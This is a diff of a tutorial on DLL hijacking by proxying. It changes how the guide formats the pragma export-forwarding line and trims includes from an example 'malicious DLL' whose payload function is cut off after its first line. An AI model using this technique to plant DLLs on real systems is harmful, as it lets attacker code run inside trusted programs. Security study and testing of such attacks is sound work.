@@ -33,7 +33,9 @@ In Procmon, you can check this with the **Result** column being set to **SUCCESS
 4. Generate the pragma comment linkers for you to implement into your malicious DLL
 It should look like :
 
-    #pragma comment(linker,"/export:FUNCTION_NAME=DLLFileName_orig.FUNCTION_NAME,@ORDINAL")
+```C
+#pragma comment(linker,"/export:FUNCTION_NAME=DLLFileName_orig.FUNCTION_NAME,@ORDINAL")
+```
 
 5. Create your DLL with the code that you want to execute, here's an example :
 
@@ -43,15 +45,7 @@ It should look like :
 // Add the generated comments here
 // # pragma comment(linker,"/export:FUNCTION_NAME=DLLFileName_orig.FUNCTION_NAME,@ORDINAL")
 // .....
-#include <stdio.h>
-#include <string.h>
-#include <process.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
 #include <windows.h>
-#include <string>
-#include <atlstr.h>
-#include <Windows.h>
 
 DWORD WINAPI payload() {
 	STARTUPINFOA info = { 0 };
